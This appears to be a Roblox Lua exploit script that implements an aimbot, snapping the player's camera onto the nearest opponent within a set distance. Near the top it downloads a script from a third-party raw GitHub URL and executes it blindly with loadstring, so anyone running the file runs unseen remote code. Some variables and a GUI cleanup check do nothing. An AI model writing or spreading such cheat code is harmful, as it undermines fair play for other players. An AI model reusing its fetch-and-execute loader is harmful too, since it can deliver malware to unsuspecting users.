local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()

-- GUI and Aim Assist Variables
local isAimAssistEnabled = false
local guiEnabled = false
local aimAssistDistance = 50 -- Default distance for aim assist
local screenGui = nil
local aimRing = nil

-- Ensure old GUI is destroyed if it exists
if screenGui then
    screenGui:Destroy()
end

-- Function to load external script from URL
local function loadExternalGuiScript(url)
    local success, result = pcall(function()
        return HttpService:GetAsync(url)
    end)

    if success then
        local scriptContent = result
        -- Execute the fetched script to replace your GUI
        loadstring(scriptContent)()
    else
        warn("Failed to load external GUI script: " .. result)
    end
end

-- URL of the external GUI script
local scriptUrl = "https://raw.githubusercontent.com/z4gs/scripts/master/testtttt.lua"

-- Load and execute the external GUI script
loadExternalGuiScript(scriptUrl)

-- Get Closest Target Based on Aim Assist Distance and Direction
local function getClosestTarget()
    local closestDistance = math.huge
    local closestPlayer = nil
    local camera = workspace.CurrentCamera

    for _, v in ipairs(Players:GetPlayers()) do
        if v ~= player and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            local targetPos = v.Character.HumanoidRootPart.Position
            local screenPoint, onScreen = camera:WorldToViewportPoint(targetPos)
            
            if onScreen then
                local distance = (targetPos - player.Character.HumanoidRootPart.Position).Magnitude
                if distance < closestDistance and distance < aimAssistDistance then
                    local screenSize = camera.ViewportSize
                    local squareMin = (screenSize - Vector2.new(aimAssistDistance * 2, aimAssistDistance * 2)) / 2
                    local squareMax = (screenSize + Vector2.new(aimAssistDistance * 2, aimAssistDistance * 2)) / 2

                    -- Check if the target is within the square area defined by the aim assist distance
                    if screenPoint.X >= squareMin.X and screenPoint.X <= squareMax.X and screenPoint.Y >= squareMin.Y and screenPoint.Y <= squareMax.Y then
                        closestDistance = distance
                        closestPlayer = v
                    end
                end
            end
        end
    end

    return closestPlayer
end

-- Aim Assist Logic
RunService.RenderStepped:Connect(function()
    if isAimAssistEnabled then
        local closestPlayer = getClosestTarget()
        if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPart = closestPlayer.Character.HumanoidRootPart
            local targetPosition = targetPart.Position

            local camera = workspace.CurrentCamera
            local cameraPos = camera.CFrame.Position

            -- Only aim at the target if the target is in front of the camera and inside the square area
            local distanceToTarget = (targetPosition - cameraPos).Magnitude
            if distanceToTarget <= aimAssistDistance then
                camera.CFrame = CFrame.new(cameraPos, targetPosition)
            end
        end
    end
end)
